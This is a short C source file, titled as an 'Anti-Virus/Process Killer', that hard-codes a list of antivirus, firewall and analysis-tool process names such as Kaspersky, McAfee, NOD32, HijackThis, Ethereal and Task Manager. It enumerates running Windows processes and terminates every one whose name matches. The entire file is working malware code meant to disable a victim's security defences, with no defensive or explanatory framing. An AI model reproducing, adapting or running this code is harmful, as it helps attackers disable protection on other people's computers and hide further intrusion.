/* 
	Anti-Virus/Process Killer By: OG
*/

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>

char *szFilez[] = 
{
	"zclient.exe",
	"kavsvc.exe",
	"mcshield.exe",
	"ashMaiSv.exe",
	"nod32krn.exe",
	"nod32kui.exe",
	"smc.exe",
	"outpost.exe",
	"vsmon.exe",
	"isafe.exe",
	"regedit.exe",
	"hijackthis.exe",
	"wpe pro.exe",
	"ethereal.exe",
	"mrt.exe",
	"taskman.exe",
	"sndsrvc.exe",
	"kav.exe"
};

int Killer()
{
	HANDLE hProcess;
	PROCESSENTRY32 pEntry32 = {0};

	hProcess = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcess == INVALID_HANDLE_VALUE)
		return false;

	pEntry32.dwSize = sizeof(PROCESSENTRY32);
	if (Process32First(hProcess, &pEntry32))
	{
		while (Process32Next(hProcess, &pEntry32))
		{
			for (int i = 0; i < (sizeof(szFilez) / sizeof(LPTSTR)); i++)
			{
				if (!strcmpi(pEntry32.szExeFile, szFilez[i]))
				{
					if (!TerminateProcess(OpenProcess(PROCESS_TERMINATE, false, pEntry32.th32ProcessID), 0))
					{
						CloseHandle(hProcess);
						return false;
					}
				}
			}
		}
	}
	CloseHandle(hProcess);
	return true;
}

int Killer();